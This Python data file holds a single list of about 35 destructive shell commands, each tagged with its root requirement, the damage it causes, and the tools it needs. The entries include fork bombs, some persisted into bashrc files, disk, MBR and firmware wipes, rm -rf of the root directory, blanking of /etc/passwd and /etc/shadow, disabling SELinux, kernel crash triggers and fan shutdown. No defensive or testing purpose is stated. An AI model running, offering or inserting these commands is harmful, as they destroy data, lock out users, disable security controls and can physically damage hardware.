COMMANDS = [
    {'command_string': 'bash -c \':(){ :|:& };:\'', 'requires_root': False, 'description': 'Fork bomb causing CPU exhaustion and system unresponsiveness', 'required_tools': ['bash']},
    {'command_string': 'sudo dd if=/dev/zero of=/dev/sda bs=1M', 'requires_root': True, 'description': 
'Overwrites entire disk with zeros, destroying all data', 'required_tools': ['dd']},
    {'command_string': 'sudo rm -rf --no-preserve-root /', 'requires_root': True, 'description': 'Deletes all files on system recursively, system unusable', 'required_tools': ['rm']},
    {'command_string': 'sudo find / -type f -exec mv {} /dev/null \\;', 'requires_root': True, 'description': 
'Attempts to move all files to /dev/null, causing data loss', 'required_tools': ['find', 'mv']},
    {'command_string': 'bash -c \'bomb() { bomb | bomb & }; bomb\'', 'requires_root': False, 'description': 
'Fork bomb causing CPU overload', 'required_tools': ['bash']},
    {'command_string': 'python3 -c "import os; while True: os.fork()"', 'requires_root': False, 
'description': 'Fork bomb in Python, exhausts process table', 'required_tools': ['python3']},
    {'command_string': 'sudo chmod -R 000 /', 'requires_root': True, 'description': 'Removes all permissions recursively, locking out all users', 'required_tools': ['chmod']},
    {'command_string': 'yes > /dev/null &', 'requires_root': False, 'description': 'Uses CPU by flooding output to /dev/null', 'required_tools': ['yes']},
    {'command_string': 'yes > bigfile.txt &', 'requires_root': False, 'description': 'Fills disk space with repetitive data in bigfile.txt', 'required_tools': ['yes']},
    {'command_string': ': > bigfile.txt && while true; do cat /dev/urandom >> bigfile.txt; done', 
'requires_root': False, 'description': 'Fills disk with random data, disk exhaustion', 'required_tools': 
['cat']},
    {'command_string': 'sudo bash -c "echo 1 > /proc/sys/kernel/sysrq"', 'requires_root': True, 
'description': 'Enables Magic SysRq key (system control)', 'required_tools': ['bash']},
    {'command_string': 'sudo bash -c "echo c > /proc/sysrq-trigger"', 'requires_root': True, 'description': 
'Triggers immediate kernel crash (crash dump)', 'required_tools': ['bash']},
    {'command_string': 'bash -c \':(){ :|:& };:\' & yes > /dev/null &', 'requires_root': False, 
'description': 'Combined fork bomb and CPU load', 'required_tools': ['bash', 'yes']},
    {'command_string': 'bash -c \':(){ logger "pwned"; :|:& };:\'', 'requires_root': False, 'description': 
'Fork bomb plus logging spam in system logs', 'required_tools': ['bash', 'logger']},
    {'command_string': 'echo \':(){ :|:& };:\' >> ~/.bashrc', 'requires_root': False, 'description': 
'Persists fork bomb on shell startup for user', 'required_tools': ['bash']},
    {'command_string': 'sudo bash -c "echo \':(){ :|:& };:\' >> /etc/bash.bashrc"', 'requires_root': True, 
'description': 'System-wide persistent fork bomb on shell startup', 'required_tools': ['bash']},
    {'command_string': 'sudo dd if=/dev/zero of=/dev/sda bs=512 count=1', 'requires_root': True, 
'description': 'Overwrites MBR, corrupts bootloader', 'required_tools': ['dd']},
    {'command_string': 'sudo ping 127.0.0.1 -s 65000 -f', 'requires_root': True, 'description': 'Floods loopback interface, DoS local networking', 'required_tools': ['ping']},
    {'command_string': 'sudo cp /dev/zero /bin/ls', 'requires_root': True, 'description': 'Replaces `ls` with zero device, breaks command', 'required_tools': ['cp']},
    {'command_string': 'sudo cp /dev/zero /bin/bash', 'requires_root': True, 'description': 'Breaks bash shell, system unusable', 'required_tools': ['cp']},
    {'command_string': 'while true; do wget http://www.textfiles.com/etext/AUTHORS/SHAKESPEARE/shakespeare-macbeth-46.txt & done', 'requires_root': False, 
'description': 'Infinite network requests, DoS network or remote server', 'required_tools': ['wget']},
    {'command_string': 'sudo sed -i \'s/SELINUX=enforcing/SELINUX=disabled/\' /etc/selinux/config', 
'requires_root': True, 'description': 'Disables SELinux, reducing security enforcement', 'required_tools': 
['sed']},
    {'command_string': 'while true; do sleep 0.01 & done', 'requires_root': False, 'description': 'Fork bomb by creating many background sleeps', 'required_tools': ['sleep']},
    {'command_string': 'sudo bash -c \'echo "" > /etc/passwd\'', 'requires_root': True, 'description': 'Wipes user accounts, prevents login', 'required_tools': ['bash']},
    {'command_string': 'sudo bash -c \'echo "" > /etc/shadow\'', 'requires_root': True, 'description': 'Wipes password hashes, locks out all users', 'required_tools': ['bash']},
    {'command_string': 'mkdir flood && cd flood && for i in {1..1000000}; do touch $i.txt; done', 
'requires_root': False, 'description': 'Creates a million empty files, exhausting inode/disk', 
'required_tools': ['mkdir', 'touch']},
    {'command_string': 'for i in $(seq 1 65535); do nc -l -p $i & done', 'requires_root': True, 
'description': 'Opens many listening ports, DoS on network resources', 'required_tools': ['seq', 'nc']},
    {'command_string': 'sudo mkfs.ext4 $(mount | grep \'^/dev/\' | awk \'{print $1}\')', 'requires_root': 
True, 'description': 'Formats mounted devices, complete data loss', 'required_tools': ['mkfs.ext4', 'mount', 
'grep', 'awk']},
    {'command_string': 'while true; do sudo reboot; done', 'requires_root': True, 'description': 'Constant reboot loop, system unavailable', 'required_tools': ['reboot']},
    {'command_string': 'perl -e \'while(1){push @a, "A"x1024}\'', 'requires_root': False, 'description': 
'Memory exhaustion via endless array growth', 'required_tools': ['perl']},
    {'command_string': 'while true; do dd if=/dev/zero of=file$(date +%s) bs=1M; done', 'requires_root': 
False, 'description': 'Disk fills quickly with zeroed files, disk exhaustion', 'required_tools': ['dd', 
'date']},
    {'command_string': 'sudo flashrom -p internal -w /dev/random', 'requires_root': True, 'description': 
'Overwrites firmware with random data, bricks hardware', 'required_tools': ['flashrom']},
    {'command_string': 'sudo bash -c \'for i in /sys/class/hwmon/*/pwm*; do echo 0 > "$i"; done\'', 
'requires_root': True, 'description': 'Disables PWM fan control, may cause overheating', 'required_tools': 
['bash']},
    {'command_string': 'sudo bash -c \'echo 0 > /sys/class/power_supply/BAT0/charge_control_end_threshold\'', 
'requires_root': True, 'description': 'Changes battery charging threshold, may harm battery', 
'required_tools': ['bash']},
    {'command_string': 'bash -c \':(){ :|:& };:\' & sudo yes > /dev/mem &', 'requires_root': True, 
'description': 'Fork bomb plus possible kernel memory corruption', 'required_tools': ['bash', 'yes']},
    {'command_string': 'sudo flashrom -p internal -w /dev/urandom', 'requires_root': True, 'description': 
'Overwrites firmware with random data, bricks hardware', 'required_tools': ['flashrom']}
]
